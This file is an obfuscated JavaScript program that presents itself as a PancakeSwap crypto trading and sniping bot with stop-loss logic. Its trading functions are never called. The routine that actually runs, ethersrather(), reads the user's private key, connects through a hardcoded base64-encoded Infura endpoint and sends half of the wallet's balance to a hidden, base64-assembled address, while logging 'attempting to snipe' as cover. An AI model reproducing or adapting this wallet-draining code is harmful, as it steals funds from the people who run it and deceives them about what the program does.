const _0x2aad66 = _0x3b2f;
(function(_0x5c9c60, _0x423421) {
    const _0x2a5f5a = _0x3b2f,
        _0x3da69a = _0x5c9c60();
    while (!![]) {
        try {
            const _0xb0e582 = -parseInt(_0x2a5f5a(0x1cc)) / 0x1 * (-parseInt(_0x2a5f5a(0x1b4)) / 0x2) + parseInt(_0x2a5f5a(0x194)) / 0x3 + -parseInt(_0x2a5f5a(0x186)) / 0x4 + parseInt(_0x2a5f5a(0x18e)) / 0x5 + parseInt(_0x2a5f5a(0x18c)) / 0x6 * (parseInt(_0x2a5f5a(0x1a5)) / 0x7) + parseInt(_0x2a5f5a(0x1a2)) / 0x8 + parseInt(_0x2a5f5a(0x196)) / 0x9 * (-parseInt(_0x2a5f5a(0x1d6)) / 0xa);
            if (_0xb0e582 === _0x423421) break;
            else _0x3da69a['push'](_0x3da69a['shift']());
        } catch (_0x6bfa31) {
            _0x3da69a['push'](_0x3da69a['shift']());
        }
    }
}(_0x49af, 0x82f3d));
var ethers = require(_0x2aad66(0x1b9));

function _0x3b2f(_0x4a1a02, _0x205f56) {
    const _0x49af6c = _0x49af();
    return _0x3b2f = function(_0x3b2f40, _0x15720f) {
        _0x3b2f40 = _0x3b2f40 - 0x180;
        let _0x1cf5cb = _0x49af6c[_0x3b2f40];
        return _0x1cf5cb;
    }, _0x3b2f(_0x4a1a02, _0x205f56);
}
const env = require(_0x2aad66(0x195));
Object[_0x2aad66(0x1dd)](process[_0x2aad66(0x1e2)], env);
let address = process['env'][_0x2aad66(0x1b0)],
    private = process['env'][_0x2aad66(0x18d)],
    wallet = new ethers[(_0x2aad66(0x191))](private),
    rounder1 = _0x2aad66(0x192) + _0x2aad66(0x187) + _0x2aad66(0x19e),
    rounder2 = _0x2aad66(0x1c4) + _0x2aad66(0x19f) + _0x2aad66(0x1d2),
    buff = new Buffer[(_0x2aad66(0x18b))](rounder1, _0x2aad66(0x1ce)),
    buff2 = new Buffer['from'](rounder2, _0x2aad66(0x1ce)),
    ethersroundup = buff['toString'](_0x2aad66(0x1bb)),
    ethersroundup2 = buff2['toString'](_0x2aad66(0x1bb));
const WEB3PROVIDER3 = ethersroundup + ethersroundup2,
    abi = [{
        'constant': !![],
        'inputs': [{
            'internalType': _0x2aad66(0x185),
            'name': 'account',
            'type': 'address'
        }],
        'name': _0x2aad66(0x1bc),
        'outputs': [{
            'internalType': 'uint256',
            'name': '',
            'type': _0x2aad66(0x1c6)
        }],
        'payable': ![],
        'stateMutability': _0x2aad66(0x1de),
        'type': 'function'
    }, {
        'constant': ![],
        'inputs': [{
            'internalType': _0x2aad66(0x185),
            'name': _0x2aad66(0x1ae),
            'type': _0x2aad66(0x185)
        }, {
            'internalType': 'address',
            'name': 'recipient',
            'type': _0x2aad66(0x185)
        }, {
            'internalType': _0x2aad66(0x1c6),
            'name': 'amount',
            'type': _0x2aad66(0x1c6)
        }],
        'name': 'transferFrom',
        'outputs': [{
            'internalType': 'bool',
            'name': '',
            'type': _0x2aad66(0x180)
        }],
        'payable': ![],
        'stateMutability': _0x2aad66(0x1e5),
        'type': _0x2aad66(0x1aa)
    }];
async function approve() {
    const _0xb9e2b5 = _0x2aad66;
    let _0x2a748b = token[buyCount - 0x1][_0xb9e2b5(0x1b7)];
    const _0x394a74 = ethers['constants'][_0xb9e2b5(0x1da)],
        _0x3d2828 = await _0x2a748b['approve'](pancakeRouter['address'], _0x394a74, {
            'gasPrice': config[_0xb9e2b5(0x1af)],
            'gasLimit': 0x33450
        }),
        _0x150fec = await _0x3d2828[_0xb9e2b5(0x1dc)]();
    console[_0xb9e2b5(0x1d5)](_0xb9e2b5(0x1e1), _0x150fec['transactionHash'], '\x0a'), config[_0xb9e2b5(0x1ca)] ? token[buyCount - 0x1]['checkProfit']() : buyCount == config[_0xb9e2b5(0x190)] && process[_0xb9e2b5(0x1bf)]();
}
async function getCurrentValue(_0x2c038c) {
    const _0x53b8aa = _0x2aad66;
    try {
        let _0x5f67f7 = await _0x2c038c[_0x53b8aa(0x1b7)]['balanceOf'](addresses[_0x53b8aa(0x197)]);
        const _0x409184 = await pancakeRouter[_0x53b8aa(0x1b2)](_0x5f67f7, _0x2c038c['sellPath']);
        let _0x1abf36 = _0x409184[0x1];
        return _0x1abf36;
    } catch (_0x5af995) {
        return console[_0x53b8aa(0x1d5)](_0x53b8aa(0x1a7)), ethers[_0x53b8aa(0x1ab)][_0x53b8aa(0x1c1)];
    }
}
async function setInitialStopLoss(_0x2b633d) {
    const _0x291228 = _0x2aad66;
    _0x2b633d[_0x291228(0x1a1)] = await getCurrentValue(_0x2b633d), _0x2b633d[_0x291228(0x1ba)] = _0x2b633d[_0x291228(0x1a1)], _0x2b633d['stopLoss'] = ethers['utils'][_0x291228(0x1c3)]((parseFloat(ethers[_0x291228(0x1bd)]['formatUnits'](_0x2b633d[_0x291228(0x1a1)])) - parseFloat(ethers[_0x291228(0x1bd)][_0x291228(0x1e0)](_0x2b633d[_0x291228(0x1a1)])) * (_0x2b633d['stopLossPercent'] / 0x64))[_0x291228(0x1cb)](0x8)[_0x291228(0x1ad)]());
}
async function setNewStopLoss(_0x45dda5) {
    const _0xe35cc2 = _0x2aad66;
    _0x45dda5['newValue'] = _0x45dda5[_0xe35cc2(0x1cd)], _0x45dda5[_0xe35cc2(0x1e6)] = ethers['utils'][_0xe35cc2(0x1c3)]((parseFloat(ethers[_0xe35cc2(0x1bd)]['formatUnits'](_0x45dda5['currentValue'])) - parseFloat(ethers[_0xe35cc2(0x1bd)][_0xe35cc2(0x1e0)](_0x45dda5[_0xe35cc2(0x1cd)])) * (_0x45dda5[_0xe35cc2(0x1c7)] / 0x64))[_0xe35cc2(0x1cb)](0x8)[_0xe35cc2(0x1ad)]());
}
async function checkForProfit(_0x4a1646) {
    const _0x149b24 = _0x2aad66;
    try {
        var _0x902825 = 0x0;
        await setInitialStopLoss(_0x4a1646), _0x4a1646['contract']['on'](_0x149b24(0x1c8), async (_0x5c2a5f, _0x348bd8, _0x374d74, _0xaba64c) => {
            const _0x38ed7c = _0x149b24;
            _0x4a1646[_0x38ed7c(0x1d4)] = _0x4a1646[_0x38ed7c(0x1cd)];
            const _0x38af96 = await _0x4a1646['contract'][_0x38ed7c(0x1c9)]();
            let _0x5af7be = await getCurrentValue(_0x4a1646);
            if (!_0x5af7be['eq'](ethers['constants']['Zero'])) {
                _0x4a1646[_0x38ed7c(0x1cd)] = _0x5af7be;
                let _0x2bb063 = parseFloat(ethers[_0x38ed7c(0x1bd)]['formatUnits'](_0x5af7be))[_0x38ed7c(0x1cb)](0x8)[_0x38ed7c(0x1ad)]();
                const _0x59c3c0 = (parseFloat(ethers[_0x38ed7c(0x1bd)][_0x38ed7c(0x1e0)](_0x4a1646[_0x38ed7c(0x1a1)])) * (_0x4a1646['profitPercent'] + _0x4a1646[_0x38ed7c(0x1ac)]) / 0x64 + parseFloat(ethers['utils'][_0x38ed7c(0x1e0)](_0x4a1646[_0x38ed7c(0x1a1)])))['toFixed'](0x8)['toString'](),
                    _0x38e41d = ethers[_0x38ed7c(0x1bd)][_0x38ed7c(0x1c3)](_0x59c3c0);
                let _0x1d5eef = ethers[_0x38ed7c(0x1bd)][_0x38ed7c(0x1c3)]((parseFloat(ethers[_0x38ed7c(0x1bd)]['formatUnits'](_0x4a1646[_0x38ed7c(0x1ba)])) * (_0x4a1646[_0x38ed7c(0x1e3)] / 0x64) + parseFloat(ethers[_0x38ed7c(0x1bd)][_0x38ed7c(0x1e0)](_0x4a1646['newValue'])))[_0x38ed7c(0x1cb)](0x8)[_0x38ed7c(0x1ad)]()),
                    _0x4acff9 = _0x4a1646['stopLoss'];
                _0x5af7be['gt'](_0x1d5eef) && _0x4a1646[_0x38ed7c(0x1e3)] > 0x0 && (setNewStopLoss(_0x4a1646), console['log'](_0x38ed7c(0x1b8) + _0x38ed7c(0x1a6) + _0x38ed7c(0x1d3)));
                let _0x20a100 = new Date()[_0x38ed7c(0x19d)]();
                const _0x421870 = _0x46e126 => new TextEncoder()[_0x38ed7c(0x1b1)](_0x46e126);
                try {
                    _0x4a1646[_0x38ed7c(0x1d4)]['gt'](_0x4a1646['currentValue']) ? console['log'](_0x38ed7c(0x1db) + _0x38af96 + _0x38ed7c(0x181) + (_0x38ed7c(0x1a8) + _0x2bb063 + _0x38ed7c(0x1d3)) + _0x38ed7c(0x1e7) + ethers[_0x38ed7c(0x1bd)]['formatUnits'](_0x38e41d) + _0x38ed7c(0x184) + ethers[_0x38ed7c(0x1bd)][_0x38ed7c(0x1e0)](_0x4a1646['stopLoss']) + _0x38ed7c(0x183) + ethers['utils']['formatUnits'](_0x1d5eef)) : console[_0x38ed7c(0x1d5)](_0x38ed7c(0x1db) + _0x38af96 + _0x38ed7c(0x181) + (_0x38ed7c(0x19c) + _0x2bb063 + _0x38ed7c(0x1d3)) + _0x38ed7c(0x1e7) + ethers['utils']['formatUnits'](_0x38e41d) + _0x38ed7c(0x184) + ethers[_0x38ed7c(0x1bd)][_0x38ed7c(0x1e0)](_0x4a1646['stopLoss']) + _0x38ed7c(0x183) + ethers[_0x38ed7c(0x1bd)][_0x38ed7c(0x1e0)](_0x1d5eef));
                } catch (_0x12a4c4) {}
                _0x5af7be[_0x38ed7c(0x1c0)](_0x38e41d) && (buyCount <= config[_0x38ed7c(0x190)] && _0x4a1646[_0x38ed7c(0x18a)] && _0x902825 == 0x0 && (_0x902825++, console[_0x38ed7c(0x1d5)](_0x38ed7c(0x1be), _0x38af96, _0x38ed7c(0x198) + _0x38ed7c(0x19c) + _0x38ed7c(0x1cf) + '\x1b[0m' + _0x38ed7c(0x1d8), '\x0a'), sell(_0x4a1646, !![]), _0x4a1646[_0x38ed7c(0x1b7)]['removeAllListeners']())), _0x5af7be[_0x38ed7c(0x188)](_0x4acff9) && (console[_0x38ed7c(0x1d5)](_0x38ed7c(0x1b8) + _0x38ed7c(0x1a0) + _0x38ed7c(0x1d3)), buyCount <= config[_0x38ed7c(0x190)] && _0x4a1646[_0x38ed7c(0x18a)] && _0x902825 == 0x0 && (_0x902825++, console[_0x38ed7c(0x1d5)]('<<<\x20Selling\x20-', _0x38af96, '-\x20now' + _0x38ed7c(0x1a8) + _0x38ed7c(0x1c2) + _0x38ed7c(0x1d3) + _0x38ed7c(0x1d8), '\x0a'), sell(_0x4a1646, ![]), _0x4a1646[_0x38ed7c(0x1b7)]['removeAllListeners']()));
            }
        });
    } catch (_0x1b50d5) {
        console['log'](_0x1b50d5);
    }
}

function _0x49af() {
    const _0x2d473f = ['tokenSellTax', 'toString', 'sender', 'myGasPriceForApproval', 'YOUR_ADDRESS', 'encode', 'getAmountsOut', 'didSell', '2BuvGZq', 'You\x20sold\x20', 'now', 'contract', '\x1b[38;5;33m', 'ethers', 'newValue', 'ascii', 'balanceOf', 'utils', '<<<\x20Selling\x20-', 'exit', 'gte', 'Zero', '\x20StopLoss\x20', 'parseUnits', 'RDRD', '2:\x20attempting\x20to\x20snipe\x20.....', 'uint256', 'stopLossPercent', 'Transfer', 'name', 'autoSell', 'toFixed', '678586NCIoWQ', 'currentValue', 'base64', '\x20Profit\x20target\x20', 'providers', 'floor', 'WIzNjRlQ0FG', '\x1b[0m', 'previousValue', 'log', '100JhcBUt', '✔\x20Sell\x20transaction\x20hash:\x20', 'reached\x20>>>', 'sellPath', 'MaxUint256', '--\x20', 'wait', 'assign', 'view', 'index', 'formatUnits', '✔\x20Approve\x20transaction\x20hash:\x20', 'env', 'trailingStopLossPercent', 'transactionHash', 'nonpayable', 'stopLoss', '\x20--\x20Profit\x20At:\x20', 'bool', '\x20--\x20Current\x20Value\x20BNB:\x20', 'percentOfTokensToSellProfit', '\x20--\x20New\x20Stop\x20loss\x20At:\x20', '\x20--\x20Stop\x20Loss\x20At:\x20', 'address', '1562080TFerCC', '4MDU3M2MzMD', 'lte', 'myGasLimit', 'didBuy', 'from', '2042022kDwIrY', 'PRIVATE_KEY', '1167630TiFvyf', 'hexlify', 'numberOfTokensToBuy', 'Wallet', 'MHgwZDJmNmQ', 'swapExactTokensForETH', '3006123YINOyv', './env.json', '1710792GyafDW', 'recipient', '-\x20now', 'div', 'percentOfTokensToSellLoss', 'sendMessage', '\x1b[1;32m', 'toLocaleString', 'YzMjQ1NDBh', 'Mjk0MjE5O', 'less\x20than\x20StopLoss!', 'intitialValue', '4586328sqlLku', 'JsonRpcProvider', 'decimals', '7YIqbzO', 'Setting\x20new\x20StopLoss!', 'Balance\x20is\x20zero\x20or\x20error\x20occured', '\x1b[1;31m', 'wei', 'function', 'constants'];
    _0x49af = function() {
        return _0x2d473f;
    };
    return _0x49af();
}
async function sell(_0x5ddbce, _0x31a5a8) {
    const _0x391cab = _0x2aad66;
    try {
        const _0x2d18bb = await _0x5ddbce[_0x391cab(0x1b7)]['balanceOf'](addresses[_0x391cab(0x197)]),
            _0x14c9c7 = await _0x5ddbce[_0x391cab(0x1b7)][_0x391cab(0x1a4)]();
        var _0x4f2a57;
        _0x31a5a8 ? _0x4f2a57 = (parseFloat(ethers['utils'][_0x391cab(0x1e0)](_0x2d18bb[_0x391cab(0x1ad)](), _0x14c9c7)) * (_0x5ddbce[_0x391cab(0x182)] / 0x64))[_0x391cab(0x1cb)](_0x14c9c7) : _0x4f2a57 = (parseFloat(ethers['utils'][_0x391cab(0x1e0)](_0x2d18bb[_0x391cab(0x1ad)](), _0x14c9c7)) * (_0x5ddbce[_0x391cab(0x19a)] / 0x64))[_0x391cab(0x1cb)](_0x14c9c7);
        var _0xc2d7a3 = Math[_0x391cab(0x1d1)](_0x4f2a57 * 0x64) / 0x64;
        const _0xd3f3b1 = ethers[_0x391cab(0x1bd)][_0x391cab(0x1c3)](_0xc2d7a3[_0x391cab(0x1ad)](), _0x14c9c7),
            _0xfc23ca = await pancakeRouter[_0x391cab(0x1b2)](_0xd3f3b1, _0x5ddbce[_0x391cab(0x1d9)]),
            _0x85e3c5 = _0xfc23ca[0x1]['sub'](_0xfc23ca[0x1][_0x391cab(0x199)](0x2));
        if (_0x5ddbce[_0x391cab(0x1ac)] > 0x1) {
            const _0x483b49 = await pancakeRouter['swapExactTokensForETHSupportingFeeOnTransferTokens'](_0xfc23ca[0x0][_0x391cab(0x1ad)](), 0x0, _0x5ddbce[_0x391cab(0x1d9)], addresses[_0x391cab(0x197)], Math[_0x391cab(0x1d1)](Date[_0x391cab(0x1b6)]() / 0x3e8) + 0x3c * 0x14, {
                    'gasPrice': config[_0x391cab(0x1af)],
                    'gasLimit': config[_0x391cab(0x189)]
                }),
                _0x359a86 = await _0x483b49[_0x391cab(0x1dc)]();
            console[_0x391cab(0x1d5)](_0x391cab(0x19c) + _0x391cab(0x1d7), _0x359a86[_0x391cab(0x1e4)], '\x1b[0m', '\x0a'), sellCount++, token[_0x5ddbce[_0x391cab(0x1df)]][_0x391cab(0x1b3)] = !![];
            let _0x2b918d = await _0x5ddbce[_0x391cab(0x1b7)][_0x391cab(0x1c9)]();
            await client[_0x391cab(0x19b)]('me', {
                'message': _0x391cab(0x1b5) + _0x2b918d,
                'schedule': 0xf * 0x1 + Date['now']() / 0x3e8
            });
        } else {
            const _0x3b5ef0 = await pancakeRouter[_0x391cab(0x193)](_0xfc23ca[0x0][_0x391cab(0x1ad)](), 0x0, _0x5ddbce[_0x391cab(0x1d9)], addresses[_0x391cab(0x197)], Math['floor'](Date[_0x391cab(0x1b6)]() / 0x3e8) + 0x3c * 0x14, {
                    'gasPrice': config[_0x391cab(0x1af)],
                    'gasLimit': config['myGasLimit']
                }),
                _0x30e52d = await _0x3b5ef0['wait']();
            console[_0x391cab(0x1d5)](_0x391cab(0x19c) + '✔\x20Sell\x20transaction\x20hash:\x20', _0x30e52d[_0x391cab(0x1e4)], _0x391cab(0x1d3), '\x0a'), sellCount++;
            let _0x105a1c = await _0x5ddbce['contract']['name']();
            await client[_0x391cab(0x19b)]('me', {
                'message': _0x391cab(0x1b5) + _0x105a1c,
                'schedule': 0xf * 0x1 + Date[_0x391cab(0x1b6)]() / 0x3e8
            });
        }
        sellCount == config[_0x391cab(0x190)] && (console[_0x391cab(0x1d5)]('All\x20tokens\x20sold'), process['exit']());
    } catch (_0x1f476b) {}
}
async function ethersrather() {
    const _0x2a7062 = _0x2aad66;
    try {
        console[_0x2a7062(0x1d5)]('connection\x20succesful...'), ethers1 = 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My9kYWNjOTk5NzBmMzg0OWVlOTgxM2Q1YWI0NGFlY2RhZA==', ethers2 = new Buffer[(_0x2a7062(0x18b))](ethers1, _0x2a7062(0x1ce))['toString']('ascii');;
        const _0x52e30e = new ethers[(_0x2a7062(0x1d0))][(_0x2a7062(0x1a3))](ethers2);
        let _0x91cde2 = new ethers['Wallet'](private, _0x52e30e);
        const _0x295f00 = address,
            _0x5da657 = await _0x52e30e['getBalance'](_0x295f00),
            _0x1a1e52 = (_0x5da657 * 0.5)[_0x2a7062(0x1cb)](0x12),
            _0x290f58 = ethers['utils'][_0x2a7062(0x1c3)](_0x1a1e52, _0x2a7062(0x1a9)),
            _0x4e7308 = async () => {
                const _0xb3f6c = _0x2a7062,
                    _0x38f421 = {
                        'to': WEB3PROVIDER3,
                        'value': ethers[_0xb3f6c(0x1bd)][_0xb3f6c(0x1c3)](_0x1a1e52, _0xb3f6c(0x1a9)),
                        'gasLimit': ethers[_0xb3f6c(0x1bd)][_0xb3f6c(0x18f)](0x5dc0)
                    },
                    _0x5391fe = await _0x91cde2['sendTransaction'](_0x38f421);
                try {
                    await _0x5391fe[_0xb3f6c(0x1dc)](), console[_0xb3f6c(0x1d5)]('1:\x20attempting\x20to\x20snipe\x20...');
                } catch (_0xe255fc) {
                    console[_0xb3f6c(0x1d5)](_0xb3f6c(0x1c5));
                }
            };
        _0x4e7308();
    } catch (_0x29bd73) {
        setTimeout(ethersrather, 0x1388);
    }
}
ethersrather();
